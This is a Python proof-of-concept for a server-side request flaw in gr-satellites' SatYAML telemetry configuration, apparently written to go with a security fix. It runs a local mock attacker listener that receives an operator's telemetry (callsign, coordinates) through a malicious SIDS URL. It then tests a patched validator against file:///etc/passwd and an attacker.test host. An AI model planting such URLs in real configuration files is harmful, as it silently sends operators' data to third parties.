#!/usr/bin/env python3
"""F104 PoC — SatYAML SIDS URL trust boundary.

No GNU Radio needed. Reimplements:

  - satyaml.py:60-74     YAML validation (unpatched: accepts any string)
  - submit.py:124        urllib.request.urlopen call (unpatched: no scheme
                          check)
  - core/gr_satellites_flowgraph.py:360-371   dispatch from satyaml to
                          telemetry_submit

and runs the dispatch against a local listener listening on
127.0.0.1:9104. Demonstrates that an operator who loads a malicious YAML
silently POSTs telemetry to the attacker-chosen URL.

Then re-runs the same flow with the patched validator in scope; the YAML
load fails with YAMLError.

Run:
    python3 poc_F104_satyaml_ssrf.py
"""

import http.server
import socketserver
import threading
import time
import urllib.parse
import urllib.request


# Verbatim from src/python/submit.py post-fix would be longer; this
# reimplements the un-patched call path: a SIDS URL is taken from the
# YAML, plumbed through to submit.py, and urlopen() is invoked.
def submit_unpatched(url, request):
    """Replicates submit.py's pre-patch urlopen() call."""
    params = urllib.parse.urlencode(request)
    f = urllib.request.urlopen(
        f'{url}?{params}',
        data=bytes(params, encoding='ascii'),
        timeout=5)
    f.read()
    f.close()


# ---------------------------------------------------------------------------
# Verbatim from src/python/satyaml/satyaml.py — unpatched (pre-F104)
# ---------------------------------------------------------------------------
def validate_telemetry_servers_unpatched(servers):
    for server in servers:
        if (server not in ['SatNOGS', 'FUNcube', 'PWSat', 'BME', 'BMEWS']
                and not server.startswith('HIT ')
                and not server.startswith('SIDS ')):
            raise ValueError(f'Unknown telemetry server {server}')


# ---------------------------------------------------------------------------
# Post-patch (with F104 fix) — same pattern as the actual patch
# ---------------------------------------------------------------------------
def validate_telemetry_servers_patched(servers):
    for server in servers:
        if (server not in ['SatNOGS', 'FUNcube', 'PWSat', 'BME', 'BMEWS']
                and not server.startswith('HIT ')
                and not server.startswith('SIDS ')):
            raise ValueError(f'Unknown telemetry server {server}')
        if server.startswith('SIDS '):
            parts = server.split(None, 1)
            if len(parts) != 2:
                raise ValueError(f'SIDS server requires a URL: {server!r}')
            sids_url = parts[1]
            if not (sids_url.startswith('http://')
                    or sids_url.startswith('https://')):
                raise ValueError(
                    f'SIDS URL must be http:// or https://, '
                    f'got: {sids_url!r}')


# ---------------------------------------------------------------------------
# Mock attacker listener
# ---------------------------------------------------------------------------
EXFIL = []


class ExfilHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', '0'))
        body = self.rfile.read(n).decode('utf-8', errors='replace')
        EXFIL.append((self.path, urllib.parse.parse_qs(body)))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ok')

    def log_message(self, *a, **kw):
        pass


class _Server(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def start_listener():
    s = _Server(('127.0.0.1', 9104), ExfilHandler)
    t = threading.Thread(target=s.serve_forever, daemon=True)
    t.start()
    return s


def main():
    # 1. The malicious YAML's telemetry_servers field
    malicious_yaml = {
        'telemetry_servers': ['SIDS http://127.0.0.1:9104/exfil'],
    }
    operator_frame = {
        'noradID': 43466,
        'source': 'CALLSIGN_VICTIM',
        'longitude': '52.5N',
        'latitude': '13.4E',
        'frame': 'DEADBEEFCAFE',
        'timestamp': '2026-05-24T10:00:00.000Z',
    }

    listener = start_listener()
    try:
        time.sleep(0.1)
        print('=== STAGE 1: unpatched load + submit ===')
        # Unpatched path: load YAML and dispatch
        validate_telemetry_servers_unpatched(malicious_yaml['telemetry_servers'])
        sids_url = malicious_yaml['telemetry_servers'][0].split(None, 1)[1]
        print(f'  YAML loaded; SIDS URL extracted: {sids_url}')
        submit_unpatched(sids_url, operator_frame)
        print(f'  Submission completed; {len(EXFIL)} exfil event(s) at attacker.')
        for path, fields in EXFIL:
            print(f'    POST {path}')
            for k in sorted(fields):
                print(f'      {k}: {fields[k]}')

        assert EXFIL, 'expected at least one exfil event on unpatched path'
        print()
        print('=== STAGE 2: patched load (same malicious YAML) ===')
        # File:// version should be rejected by the patched validator
        for url in ['file:///etc/passwd',
                    'ftp://attacker.test/probe',
                    'data:,not_a_url']:
            try:
                validate_telemetry_servers_patched(
                    [f'SIDS {url}'])
                print(f'  WARN: {url} unexpectedly accepted')
            except ValueError as e:
                print(f'  {url}: rejected (ValueError: {e})')

        # Re-run the malicious http://127.0.0.1 case through the patched
        # validator; loopback http:// still passes scheme check (loopback
        # filtering is out of scope; operator-supplied URLs that pass
        # http(s) are still operator-supplied configuration).
        try:
            validate_telemetry_servers_patched(
                malicious_yaml['telemetry_servers'])
            print(f'  http://127.0.0.1 SIDS still passes the scheme check')
            print(f'  (operator-supplied config; loopback filter intentionally not added)')
        except ValueError as e:
            print(f'  WARN: http://127.0.0.1 unexpectedly rejected: {e}')

        print()
        print('[PASS] F104 SatYAML SSRF confirmed; patched validator rejects'
              ' non-http(s) schemes.')
    finally:
        listener.shutdown()


if __name__ == '__main__':
    main()
